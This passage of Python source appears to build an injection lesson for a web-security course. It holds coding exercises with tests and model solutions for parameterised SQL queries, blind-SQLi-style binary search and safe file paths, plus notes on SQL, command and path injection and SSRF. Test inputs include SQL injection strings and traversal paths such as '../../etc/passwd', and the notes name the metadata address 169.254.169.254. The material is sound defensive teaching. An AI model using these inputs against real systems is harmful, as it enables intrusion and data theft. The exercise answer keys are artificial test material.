''', [('safe_login("bob", "h_91cc")', True), ('safe_login("bob", "wrong")', False), ('safe_login("alice\' --", "x")', False), ('safe_login("\' OR \'1\'=\'1", "\' OR \'1\'=\'1")', False)],
         '''
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (name TEXT, pw TEXT)")
db.execute("INSERT INTO users VALUES ('alice', 'h_7f3a'), ('bob', 'h_91cc')")

def safe_login(name, pw):
    rows = db.execute("SELECT 1 FROM users WHERE name = ? AND pw = ?", (name, pw)).fetchall()
    return len(rows) > 0
''', 'Pass the values as a tuple in the second argument of execute.', '<p>A real app would store a slow password hash such as Argon2 and compare it in code, as in the hashing chapter.</p>')
K.assign('leak', 'm', 'Binary search over a yes or no oracle',
         '<p>Write <code>leak(oracle, lo, hi)</code>. <code>oracle(m)</code> returns True when the secret is greater than m. Find the secret in the range lo to hi with binary search and return <code>[secret, questions]</code>, where questions is how many times you called the oracle.</p>',
         '''
def leak(oracle, lo, hi):
    # your code here
    pass
''', [('leak(lambda m: 75 > m, 32, 126)', [75, 7]), ('leak(lambda m: 126 > m, 32, 126)', [126, 6]), ('leak(lambda m: 5 > m, 0, 9)', [5, 4]), ('leak(lambda m: 0 > m, 0, 0)', [0, 0])],
         '''
def leak(oracle, lo, hi):
    questions = 0
    while lo < hi:
        mid = (lo + hi) // 2
        questions += 1
        if oracle(mid):
            lo = mid + 1
        else:
            hi = mid
    return [lo, questions]
''', 'Keep lo and hi, ask about the middle, and move one end each time.', '<p>This is exactly what sqlmap does with a boolean condition such as unicode(substr(token, i, 1)) &gt; m.</p>')
K.assign('safe_path', 'h', 'A safe file path',
         '<p>Write <code>safe_path(base, name)</code> using <code>posixpath</code>. Join base and name, normalise the result, and return it if it is still inside base (use <code>posixpath.commonpath</code>). Otherwise return None.</p>',
         '''
import posixpath

def safe_path(base, name):
    # your code here
    pass
''', [('safe_path("/srv/up", "a.pdf")', '/srv/up/a.pdf'), ('safe_path("/srv/up", "../../etc/passwd")', None), ('safe_path("/srv/up", "x/../a.pdf")', '/srv/up/a.pdf'), ('safe_path("/srv/up", "/etc/shadow")', None), ('safe_path("/srv/up", "../up2/a")', None)],
         '''
import posixpath

def safe_path(base, name):
    full = posixpath.normpath(posixpath.join(base, name))
    if posixpath.commonpath([full, base]) != base:
        return None
    return full
''', 'join, then normpath, then compare commonpath with base.', '<p>The last test matters: /srv/up2 starts with the text /srv/up, so a startswith check would wrongly allow it. commonpath compares whole folder names.</p>')

K.must('Injection idea', 'Input pasted into a command becomes code. Phrack 1998. OWASP: number 1 2010 to 2017, A03 2021, A05 2025. Fix: keep code and data apart.')
K.must('SQL injection', 'Quote + comment (--), OR always true, UNION (same column count), stacked queries. Fix: placeholders, allow lists for identifiers, least privilege, generic errors.')
K.must('Blind SQLi', 'One bit per request. Binary search: &lceil;log<sub>2</sub> n&rceil; per character (7 for 95). Time based with SLEEP. sqlmap. Hiding errors does not fix it.')
K.must('Command injection', '<code>; &amp;&amp; || | $( )</code> and newline. Fix: subprocess list with shell=False, allow lists, shlex.quote as last resort. Shellshock CVE-2014-6271.')
K.must('SSRF', 'Server fetches internal URLs. 169.254.169.254 metadata, Capital One 2019. Resolve, block private, loopback, link local, pin the address, no redirects, IMDSv2.')
K.must('Paths and objects', 'normpath then commonpath with base. CVE-2021-41773. Never unpickle untrusted data. No user written templates (SSTI).')

T = K.topic(
    slug='cy-injection', topic='cy-injection', step=(1, 'Attacking and defending the web', 'cy-a1', 'How the web works, the OWASP Top 10, and the injection, cross site and server side request attacks behind most web breaches.', 'Intermediate'),
    title='Injection: SQL, blind SQL, commands, SSRF and paths', short='Injection', badge='1.2', minutes=80,
    lead='Why pasting input into a command is so dangerous and how to stop it: SQL injection on a real SQLite database with comments, always true conditions and UNION, parameterised queries, blind injection by binary search with the information theory behind it, OS command injection and Shellshock, server side request forgery against the cloud metadata service, and path traversal, pickle and template injection.',
    desc='injection, SQL injection, SQLi, parameterised query, prepared statement, UNION, tautology, blind SQL injection, time based, binary search, sqlmap, Heartland, TalkTalk, MOVEit, command injection, shell metacharacters, subprocess, shell=False, shlex, Shellshock, SSRF, server side request forgery, cloud metadata, 169.254.169.254, IMDSv2, Capital One, DNS rebinding, path traversal, directory traversal, CVE-2021-41773, insecure deserialisation, pickle, template injection, SSTI, WAF, least privilege, CWE-89, CWE-78, CWE-918, CWE-22',
    summary='SQL and blind SQL injection, parameterised queries, command injection, SSRF and the metadata service, path traversal and deserialisation.',
    keywords=['injection', 'SQL injection', 'blind SQLi', 'parameterised query', 'command injection', 'SSRF', 'path traversal', 'pickle', 'sqlmap', 'Capital One'],
    recap='<p>Every injection is data read as code. Use interfaces that keep them apart, validate against allow lists, and run with least privilege so one mistake cannot take everything.</p>',
    added='2026-11-15')
